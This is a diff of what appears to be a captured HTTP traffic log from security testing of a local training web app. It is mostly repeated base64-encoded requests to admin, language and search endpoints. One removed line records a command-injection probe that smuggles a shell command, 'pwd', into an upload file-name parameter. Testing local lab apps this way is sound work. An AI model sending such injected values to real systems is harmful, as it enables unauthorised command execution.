0, 0, .2), 0px 12px 17px 2px rgba(0, 0, 0, .14), 0px 5px 22px 4px rgba(0, 0, 0, .12);--mat-sys-corner-extra-large:28px;--mat-sys-corner-extra-large-top:28px 28px 0 0;--mat-sys-corner-extra-small:4px;--mat-sys-corner-extra-small-top:4px 4px 0 0;--mat-sys-corner-full:9999px;--mat-sys-corner-large:16px;--mat-sys-corner-large-end:0 16px 16px 0;--mat-sys-corner-large-start:16px 0 0 16px;--mat-sys-corner-large-top:16px 16px 0 0;--mat-sys-corner-medium:12px;--mat-sys-corner-none:0;--mat-sys-corner-small:8px;--mat-sys-dragged-state-layer-opacity:.16;--mat-sys-focus-state-layer-opacity:.12;--mat-sys-hover-state-layer-opacity:.08;--mat-sys-pressed-state-layer-opacity:.12;color:var(--mat-sys-on-surface);background-color:var(--mat-sys-surface)}html{font-family:var(--mat-sys-body-medium-font, Roboto, "Helvetica Neue", sans-serif)}.bluegrey-lightgreen-theme{--theme-primary:#438fff;--theme-primary-lighter:rgb(97.6, 161.229787234, 255);--theme-primary-light:rgb(118, 173.3829787234, 255);--theme-primary-darker:rgb(36.4, 124.770212766, 255);--theme-primary-dark:rgb(16, 112.6170212766, 255);--theme-primary-fade-10:#438fff;--theme-primary-fade-20:#438fff;--theme-primary-fade-30:#438fff;--theme-primary-fade-40:#438fff;--theme-primary-fade-50:#438fff;--theme-accent:#50a400;--theme-accent-lighter:rgb(94.9268292683, 194.6, 0);--theme-accent-light:rgb(104.8780487805, 215, 0);--theme-accent-darker:rgb(65.0731707317, 133.4, 0);--theme-accent-dark:rgb(55.1219512195, 113, 0);--theme-accent-fade-10:#50a400;--theme-accent-fade-20:#50a400;--theme-accent-fade-30:#50a400;--theme-accent-fade-40:#50a400;--theme-accent-fade-50:#50a400;--theme-warn:#ffb4ab;--theme-warn-lighter:rgb(255, 207.3214285714, 201.6);--theme-warn-light:rgb(255, 225.5357142857, 222);--theme-warn-darker:rgb(255, 152.6785714286, 140.4);--theme-warn-dark:rgb(255, 134.4642857143, 120);--theme-warn-fade-10:#ffb4ab;--theme-warn-fade-20:#ffb4ab;--theme-warn-fade-30:#ffb4ab;--theme-warn-fade-40:#ffb4ab;--theme-warn-fade-50:#ffb4ab;--theme-text:#e3e2e6;--theme-text-lighter:rgb(242.8666666667, 242.4333333333, 244.1666666667);--theme-text-light:rgb(253.4444444444, 253.3888888889, 253.6111111111);--theme-text-darker:rgb(200.5555555556, 198.6111111111, 206.3888888889);--theme-text-dark:rgb(160.8888888889, 157.5277777778, 170.9722222222);--theme-text-fade-10:#e3e2e6;--theme-text-fade-20:#e3e2e6;--theme-text-fade-30:#e3e2e6;--theme-text-fade-40:#e3e2e6;--theme-text-fade-50:#e3e2e6;--theme-text-invert-15:rgb(197.15, 196.45, 199.25);--theme-text-invert-30:rgb(167.3, 166.9, 168.5);--theme-background:#1f2022;--theme-background-lighter:rgb(45.5938461538, 47.0646153846, 50.0061538462);--theme-background-light:rgb(55.3230769231, 57.1076923077, 60.6769230769);--theme-background-darker:rgb(16.4061538462, 16.9353846154, 17.9938461538);--theme-background-dark:rgb(6.6769230769, 6.8923076923, 7.3230769231);--theme-background-darkest:hsl(220, 4.6153846154%, -1.2549019608%);--theme-thumbnail-border:1px solid #abc7ff;--mdc-filled-text-field-container-color:#0000;--mdc-filled-text-field-disabled-container-color:#0000;--theme-background:#3e3e3e;--theme-background-lighter:#4a4a4a;--theme-background-light:#5a5a5a;--theme-background-darker:#333638;--theme-background-dark:#303030;--theme-background-darkest:#2b2b2b;--theme-text:#e8ecef;--theme-text-lighter:#f2f5f7;--theme-text-light:#fff;--theme-text-darker:#b8c0c7;--theme-text-dark:#7f8a93;--mat-sys-surface:#333638;--mat-sys-on-surface:#e8ecef;--mat-sys-surface-container:#3e3e3e;--mat-sys-surface-container-high:#404244;--mat-sys-on-surface-variant:#b8c0c7;--mat-sys-outline:#5a5a5a;--mat-sys-outline-variant:#404244}.bluegrey-lightgreen-theme{--theme-warn:#f44336;--theme-warn-lighter:rgb(245.5877358491, 94.1358490566, 83.0122641509);--theme-warn-light:rgb(246.6462264151, 112.2264150943, 102.3537735849);--theme-warn-darker:rgb(242.4122641509, 39.8641509434, 24.9877358491);--theme-warn-dark:rgb(234.1839622642, 27.9622641509, 12.8160377358);--theme-warn-fade-10:#f44336;--theme-warn-fade-20:#f44336;--theme-warn-fade-30:#f44336;--theme-warn-fade-40:#f44336;--theme-warn-fade-50:#f44336;--mat-sys-error:#f44336;--mat-sys-on-error:#fff}@media screen and (-webkit-min-device-pixel-ratio:0){}</style><link rel="stylesheet" href="styles.css" media="print" onload="this.media='all'"><noscript><link rel="stylesheet" href="styles.css"></noscript></head>
-<body class="bluegrey-lightgreen-theme">
-  <app-root></app-root>
-<link rel="modulepreload" href="chunk-KD3CNUZG.js"><link rel="modulepreload" href="chunk-PX7UKXVL.js"><link rel="modulepreload" href="chunk-Y3BEW76R.js"><link rel="modulepreload" href="chunk-R7LX7FKI.js"><link rel="modulepreload" href="chunk-7U6P4YGV.js"><link rel="modulepreload" href="chunk-UNFVUBM2.js"><link rel="modulepreload" href="chunk-KI34UYIE.js"><link rel="modulepreload" href="chunk-B3RFAYKZ.js"><link rel="modulepreload" href="chunk-EMJTEAHL.js"><link rel="modulepreload" href="chunk-6RWMKLEX.js"><script src="polyfills.js" type="module"></script><script src="scripts.js" defer></script><script src="main.js" type="module"></script></body>
-</html>
-]]></response>
+    <request base64="true"><![CDATA[R0VUIC9yZXN0L2FkbWluL2FwcGxpY2F0aW9uLWNvbmZpZ3VyYXRpb24gSFRUUC8xLjENCkhvc3Q6IGxvY2FsaG9zdDo5MDAwDQpzZWMtY2gtdWEtcGxhdGZvcm06ICJXaW5kb3dzIg0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L3BsYWluLCAqLyoNCnNlYy1jaC11YTogIk5vdDtBPUJyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxNTAiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTUwLjAuMC4wIFNhZmFyaS81MzcuMzYNCnNlYy1jaC11YS1tb2JpbGU6ID8wDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Nb2RlOiBjb3JzDQpTZWMtRmV0Y2gtRGVzdDogZW1wdHkNClJlZmVyZXI6IGh0dHA6Ly9sb2NhbGhvc3Q6OTAwMC8NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkNvb2tpZTogd2VsY29tZWJhbm5lcl9zdGF0dXM9ZGlzbWlzczsgY29va2llY29uc2VudF9zdGF0dXM9ZGlzbWlzczsgY29udGludWVDb2RlPTY3Z3dySldaN2xlUkVvRHlOYjQxT1ZwUThHbXZTampobnowdnpYSzN4anE2NU1rTEJuYTkybVlQZ2pyOTsgbGFuZ3VhZ2U9ZW4NCklmLU5vbmUtTWF0Y2g6IFcvIjVjMTktS0F6V2p6QnIzWmRFNm0reGY5RkNuOEkwTFBVIg0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=]]></request>
+    <status>304</status>
+    <responselength>306</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyI1YzE5LUtBeldqekJyM1pkRTZtK3hmOUZDbjhJMExQVSINCkRhdGU6IFRodSwgMDMgU2VwIDIwMjYgMTg6MDA6MTcgR01UDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQpLZWVwLUFsaXZlOiB0aW1lb3V0PTUNCg0K]]></response>
     <comment></comment>
   </item>
   <item>
-    <time>Fri Jul 10 00:01:57 IST 2026</time>
-    <url><![CDATA[http://localhost:3000/file-upload?filename=test.jpg%3B%20pwd]]></url>
+    <time>Thu Sep 03 23:30:18 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/rest/admin/application-configuration]]></url>
     <host ip="127.0.0.1">localhost</host>
-    <port>3000</port>
+    <port>9000</port>
     <protocol>http</protocol>
     <method><![CDATA[GET]]></method>
-    <path><![CDATA[/file-upload?filename=test.jpg%3B%20pwd]]></path>
+    <path><![CDATA[/rest/admin/application-configuration]]></path>
     <extension>null</extension>
-    <request base64="false"><![CDATA[GET /file-upload?filename=test.jpg%3B%20pwd HTTP/1.1
-Host: localhost:3000
-sec-ch-ua-platform: "Windows"
-Accept-Language: en-US,en;q=0.9
-sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
-sec-ch-ua-mobile: ?0
-Accept: */*
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: cors
-Sec-Fetch-Dest: empty
-Referer: http://localhost:3000/
-Accept-Encoding: gzip, deflate, br
-Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
-Connection: keep-alive
-
-]]></request>
+    <request base64="true"><![CDATA[R0VUIC9yZXN0L2FkbWluL2FwcGxpY2F0aW9uLWNvbmZpZ3VyYXRpb24gSFRUUC8xLjENCkhvc3Q6IGxvY2FsaG9zdDo5MDAwDQpzZWMtY2gtdWEtcGxhdGZvcm06ICJXaW5kb3dzIg0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L3BsYWluLCAqLyoNCnNlYy1jaC11YTogIk5vdDtBPUJyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxNTAiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTUwLjAuMC4wIFNhZmFyaS81MzcuMzYNCnNlYy1jaC11YS1tb2JpbGU6ID8wDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Nb2RlOiBjb3JzDQpTZWMtRmV0Y2gtRGVzdDogZW1wdHkNClJlZmVyZXI6IGh0dHA6Ly9sb2NhbGhvc3Q6OTAwMC8NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkNvb2tpZTogd2VsY29tZWJhbm5lcl9zdGF0dXM9ZGlzbWlzczsgY29va2llY29uc2VudF9zdGF0dXM9ZGlzbWlzczsgY29udGludWVDb2RlPTY3Z3dySldaN2xlUkVvRHlOYjQxT1ZwUThHbXZTampobnowdnpYSzN4anE2NU1rTEJuYTkybVlQZ2pyOTsgbGFuZ3VhZ2U9ZW4NCklmLU5vbmUtTWF0Y2g6IFcvIjVjMTktS0F6V2p6QnIzWmRFNm0reGY5RkNuOEkwTFBVIg0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=]]></request>
+    <status>304</status>
+    <responselength>306</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyI1YzE5LUtBeldqekJyM1pkRTZtK3hmOUZDbjhJMExQVSINCkRhdGU6IFRodSwgMDMgU2VwIDIwMjYgMTg6MDA6MTggR01UDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQpLZWVwLUFsaXZlOiB0aW1lb3V0PTUNCg0K]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:30:18 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/rest/admin/application-configuration]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/admin/application-configuration]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9yZXN0L2FkbWluL2FwcGxpY2F0aW9uLWNvbmZpZ3VyYXRpb24gSFRUUC8xLjENCkhvc3Q6IGxvY2FsaG9zdDo5MDAwDQpzZWMtY2gtdWEtcGxhdGZvcm06ICJXaW5kb3dzIg0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L3BsYWluLCAqLyoNCnNlYy1jaC11YTogIk5vdDtBPUJyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxNTAiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTUwLjAuMC4wIFNhZmFyaS81MzcuMzYNCnNlYy1jaC11YS1tb2JpbGU6ID8wDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Nb2RlOiBjb3JzDQpTZWMtRmV0Y2gtRGVzdDogZW1wdHkNClJlZmVyZXI6IGh0dHA6Ly9sb2NhbGhvc3Q6OTAwMC8NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkNvb2tpZTogd2VsY29tZWJhbm5lcl9zdGF0dXM9ZGlzbWlzczsgY29va2llY29uc2VudF9zdGF0dXM9ZGlzbWlzczsgY29udGludWVDb2RlPTY3Z3dySldaN2xlUkVvRHlOYjQxT1ZwUThHbXZTampobnowdnpYSzN4anE2NU1rTEJuYTkybVlQZ2pyOTsgbGFuZ3VhZ2U9ZW4NCklmLU5vbmUtTWF0Y2g6IFcvIjVjMTktS0F6V2p6QnIzWmRFNm0reGY5RkNuOEkwTFBVIg0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=]]></request>
+    <status>304</status>
+    <responselength>306</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyI1YzE5LUtBeldqekJyM1pkRTZtK3hmOUZDbjhJMExQVSINCkRhdGU6IFRodSwgMDMgU2VwIDIwMjYgMTg6MDA6MTggR01UDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQpLZWVwLUFsaXZlOiB0aW1lb3V0PTUNCg0K]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:30:19 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/rest/admin/application-configuration]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/admin/application-configuration]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9yZXN0L2FkbWluL2FwcGxpY2F0aW9uLWNvbmZpZ3VyYXRpb24gSFRUUC8xLjENCkhvc3Q6IGxvY2FsaG9zdDo5MDAwDQpzZWMtY2gtdWEtcGxhdGZvcm06ICJXaW5kb3dzIg0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L3BsYWluLCAqLyoNCnNlYy1jaC11YTogIk5vdDtBPUJyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxNTAiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTUwLjAuMC4wIFNhZmFyaS81MzcuMzYNCnNlYy1jaC11YS1tb2JpbGU6ID8wDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Nb2RlOiBjb3JzDQpTZWMtRmV0Y2gtRGVzdDogZW1wdHkNClJlZmVyZXI6IGh0dHA6Ly9sb2NhbGhvc3Q6OTAwMC8NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkNvb2tpZTogd2VsY29tZWJhbm5lcl9zdGF0dXM9ZGlzbWlzczsgY29va2llY29uc2VudF9zdGF0dXM9ZGlzbWlzczsgY29udGludWVDb2RlPTY3Z3dySldaN2xlUkVvRHlOYjQxT1ZwUThHbXZTampobnowdnpYSzN4anE2NU1rTEJuYTkybVlQZ2pyOTsgbGFuZ3VhZ2U9ZW4NCklmLU5vbmUtTWF0Y2g6IFcvIjVjMTktS0F6V2p6QnIzWmRFNm0reGY5RkNuOEkwTFBVIg0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=]]></request>
+    <status>304</status>
+    <responselength>306</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyI1YzE5LUtBeldqekJyM1pkRTZtK3hmOUZDbjhJMExQVSINCkRhdGU6IFRodSwgMDMgU2VwIDIwMjYgMTg6MDA6MTkgR01UDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQpLZWVwLUFsaXZlOiB0aW1lb3V0PTUNCg0K]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:30:17 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/rest/admin/application-version]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/admin/application-version]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9yZXN0L2FkbWluL2FwcGxpY2F0aW9uLXZlcnNpb24gSFRUUC8xLjENCkhvc3Q6IGxvY2FsaG9zdDo5MDAwDQpzZWMtY2gtdWEtcGxhdGZvcm06ICJXaW5kb3dzIg0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L3BsYWluLCAqLyoNCnNlYy1jaC11YTogIk5vdDtBPUJyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxNTAiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTUwLjAuMC4wIFNhZmFyaS81MzcuMzYNCnNlYy1jaC11YS1tb2JpbGU6ID8wDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Nb2RlOiBjb3JzDQpTZWMtRmV0Y2gtRGVzdDogZW1wdHkNClJlZmVyZXI6IGh0dHA6Ly9sb2NhbGhvc3Q6OTAwMC8NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkNvb2tpZTogd2VsY29tZWJhbm5lcl9zdGF0dXM9ZGlzbWlzczsgY29va2llY29uc2VudF9zdGF0dXM9ZGlzbWlzczsgY29udGludWVDb2RlPTY3Z3dySldaN2xlUkVvRHlOYjQxT1ZwUThHbXZTampobnowdnpYSzN4anE2NU1rTEJuYTkybVlQZ2pyOTsgbGFuZ3VhZ2U9ZW4NCklmLU5vbmUtTWF0Y2g6IFcvIjE0LVdJenQrdmx0TUNrckQ2NnZubHhCM3QrclAzNCINCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCg0K]]></request>
+    <status>304</status>
+    <responselength>304</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyIxNC1XSXp0K3ZsdE1Da3JENjZ2bmx4QjN0K3JQMzQiDQpEYXRlOiBUaHUsIDAzIFNlcCAyMDI2IDE4OjAwOjE3IEdNVA0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KS2VlcC1BbGl2ZTogdGltZW91dD01DQoNCg==]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:30:18 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/rest/admin/application-version]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/admin/application-version]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9yZXN0L2FkbWluL2FwcGxpY2F0aW9uLXZlcnNpb24gSFRUUC8xLjENCkhvc3Q6IGxvY2FsaG9zdDo5MDAwDQpzZWMtY2gtdWEtcGxhdGZvcm06ICJXaW5kb3dzIg0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L3BsYWluLCAqLyoNCnNlYy1jaC11YTogIk5vdDtBPUJyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxNTAiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTUwLjAuMC4wIFNhZmFyaS81MzcuMzYNCnNlYy1jaC11YS1tb2JpbGU6ID8wDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Nb2RlOiBjb3JzDQpTZWMtRmV0Y2gtRGVzdDogZW1wdHkNClJlZmVyZXI6IGh0dHA6Ly9sb2NhbGhvc3Q6OTAwMC8NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkNvb2tpZTogd2VsY29tZWJhbm5lcl9zdGF0dXM9ZGlzbWlzczsgY29va2llY29uc2VudF9zdGF0dXM9ZGlzbWlzczsgY29udGludWVDb2RlPTY3Z3dySldaN2xlUkVvRHlOYjQxT1ZwUThHbXZTampobnowdnpYSzN4anE2NU1rTEJuYTkybVlQZ2pyOTsgbGFuZ3VhZ2U9ZW4NCklmLU5vbmUtTWF0Y2g6IFcvIjE0LVdJenQrdmx0TUNrckQ2NnZubHhCM3QrclAzNCINCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCg0K]]></request>
+    <status>304</status>
+    <responselength>304</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyIxNC1XSXp0K3ZsdE1Da3JENjZ2bmx4QjN0K3JQMzQiDQpEYXRlOiBUaHUsIDAzIFNlcCAyMDI2IDE4OjAwOjE4IEdNVA0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KS2VlcC1BbGl2ZTogdGltZW91dD01DQoNCg==]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:30:18 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/rest/languages]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/languages]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9yZXN0L2xhbmd1YWdlcyBIVFRQLzEuMQ0KSG9zdDogbG9jYWxob3N0OjkwMDANCnNlYy1jaC11YS1wbGF0Zm9ybTogIldpbmRvd3MiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC45DQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKg0Kc2VjLWNoLXVhOiAiTm90O0E9QnJhbmQiO3Y9IjgiLCAiQ2hyb21pdW0iO3Y9IjE1MCINClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNTAuMC4wLjAgU2FmYXJpLzUzNy4zNg0Kc2VjLWNoLXVhLW1vYmlsZTogPzANClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLU1vZGU6IGNvcnMNClNlYy1GZXRjaC1EZXN0OiBlbXB0eQ0KUmVmZXJlcjogaHR0cDovL2xvY2FsaG9zdDo5MDAwLw0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQ29va2llOiB3ZWxjb21lYmFubmVyX3N0YXR1cz1kaXNtaXNzOyBjb29raWVjb25zZW50X3N0YXR1cz1kaXNtaXNzOyBjb250aW51ZUNvZGU9Njdnd3JKV1o3bGVSRW9EeU5iNDFPVnBROEdtdlNqamhuejB2elhLM3hqcTY1TWtMQm5hOTJtWVBnanI5OyBsYW5ndWFnZT1lbg0KSWYtTm9uZS1NYXRjaDogVy8iMTA3ZC1DVzJQSGVaYmlPZXNHNk1pRVBlYjNPT3VoNFEiDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
+    <status>304</status>
+    <responselength>306</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyIxMDdkLUNXMlBIZVpiaU9lc0c2TWlFUGViM09PdWg0USINCkRhdGU6IFRodSwgMDMgU2VwIDIwMjYgMTg6MDA6MTggR01UDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQpLZWVwLUFsaXZlOiB0aW1lb3V0PTUNCg0K]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Thu Sep 03 23:30:18 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/rest/products/search?q=]]></url>
+    <host ip="127.0.0.1">localhost</host>
+    <port>9000</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/rest/products/search?q=]]></path>
+    <extension>null</extension>
